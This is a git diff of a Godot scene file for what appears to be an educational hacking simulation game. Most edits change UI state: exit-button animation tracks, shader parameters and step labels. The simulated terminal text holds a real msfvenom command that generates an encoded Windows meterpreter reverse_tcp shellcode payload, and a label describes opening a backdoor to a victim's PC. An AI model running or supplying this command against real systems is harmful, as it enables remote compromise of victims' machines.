@@ -48,8 +48,8 @@ void fragment() {
 [sub_resource type="ShaderMaterial" id="ShaderMaterial_irnc6"]
 shader = SubResource("Shader_pajh4")
 shader_parameter/rect_color = Color(0, 0, 0, 0.607843)
-shader_parameter/hole_position = Vector2(0.87, -0.12)
-shader_parameter/hole_size = Vector2(0.39499998, 0.545)
+shader_parameter/hole_position = Vector2(2.18, 0.495)
+shader_parameter/hole_size = Vector2(0.585, 0.33)
 
 [sub_resource type="Animation" id="Animation_cbi8u"]
 length = 0.001
@@ -77,6 +77,18 @@ tracks/1/keys = {
 "update": 1,
 "values": ["root@DESKTOP-123ABC:~$ msfvenom -p windows/meterpreter/reverse_tcp LHOST=192.168.56.102  LPORT=8000 
 --platform windows --arch x86 -e x86/shikata_ga_nai -f c -o shellcode.txt"]
+}
+tracks/2/type = "value"
+tracks/2/imported = false
+tracks/2/enabled = true
+tracks/2/path = NodePath("WindowContainer/Terminal/HBoxContainer/ExitButton:disabled")
+tracks/2/interp = 1
+tracks/2/loop_wrap = true
+tracks/2/keys = {
+"times": PackedFloat32Array(0),
+"transitions": PackedFloat32Array(1),
+"update": 1,
+"values": [false]
 }
 
 [sub_resource type="Animation" id="Animation_lt7c1"]
@@ -251,6 +263,18 @@ tracks/8/keys = {
 "transitions": PackedFloat32Array(1),
 "update": 1,
 "values": [true]
+}
+tracks/9/type = "value"
+tracks/9/imported = false
+tracks/9/enabled = true
+tracks/9/path = NodePath("WindowContainer/Terminal/HBoxContainer/ExitButton:disabled")
+tracks/9/interp = 1
+tracks/9/loop_wrap = true
+tracks/9/keys = {
+"times": PackedFloat32Array(0),
+"transitions": PackedFloat32Array(1),
+"update": 1,
+"values": [false]
 }
 
 [sub_resource type="Animation" id="Animation_skxyw"]
@@ -1277,6 +1301,18 @@ tracks/11/keys = {
 "update": 1,
 "values": [true]
 }
+tracks/12/type = "value"
+tracks/12/imported = false
+tracks/12/enabled = true
+tracks/12/path = NodePath("WindowContainer/Terminal/HBoxContainer/ExitButton:disabled")
+tracks/12/interp = 1
+tracks/12/loop_wrap = true
+tracks/12/keys = {
+"times": PackedFloat32Array(0),
+"transitions": PackedFloat32Array(1),
+"update": 1,
+"values": [false]
+}
 
 [sub_resource type="Animation" id="Animation_uip1u"]
 resource_name = "fileless_payload_2"
@@ -2025,6 +2061,18 @@ tracks/9/keys = {
 "transitions": PackedFloat32Array(1),
 "update": 1,
 "values": [true]
+}
+tracks/10/type = "value"
+tracks/10/imported = false
+tracks/10/enabled = true
+tracks/10/path = NodePath("WindowContainer/Terminal/HBoxContainer/ExitButton:disabled")
+tracks/10/interp = 1
+tracks/10/loop_wrap = true
+tracks/10/keys = {
+"times": PackedFloat32Array(0, 4),
+"transitions": PackedFloat32Array(1, 1),
+"update": 1,
+"values": [true, false]
 }
 
 [sub_resource type="Animation" id="Animation_b3o0d"]
@@ -3773,6 +3821,7 @@ icon = ExtResource("6_igjcc")
 icon_name = "IDE"
 
 [node name="Button" parent="Desktop/IDE1" index="0"]
+disabled = true
 icon = ExtResource("6_igjcc")
 
 [node name="Label" parent="Desktop/IDE1" index="1"]
@@ -4085,6 +4134,8 @@ size_flags_vertical = 0
 text = "root@DESKTOP-123ABC:~$ msfvenom -p windows/meterpreter/reverse_tcp LHOST=192.168.56.102  LPORT=8000 
 --platform windows --arch x86 -e x86/shikata_ga_nai -f c -o shellcode.txt"
 autowrap_mode = 2
+visible_characters = 0
+visible_ratio = 0.0
 metadata/_edit_use_anchors_ = true
 
 [node name="Overlay" type="ColorRect" parent="WindowContainer/Terminal/ColorRect"]
@@ -4105,10 +4156,10 @@ anchor_top = 0.220339
 anchor_right = 0.89320385
 anchor_bottom = 0.88771194
 theme_override_font_sizes/font_size = 36
-text = "STEP 1:
-INSTALLATION
+text = "STEP 2:
+CREATING PAYLOAD
 
-installing requirements for creation"
+creating a payload that will open a backdoor to the victim's PC"
 horizontal_alignment = 1
 vertical_alignment = 1
 autowrap_mode = 2
@@ -4117,6 +4168,7 @@ visible_ratio = 0.0
 metadata/_edit_use_anchors_ = true
 
 [node name="generating exe" parent="WindowContainer/Terminal" instance=ExtResource("11_csfkx")]
+visible = false
 layout_mode = 1
 anchor_left = 0.28935245
 anchor_top = 0.21073072
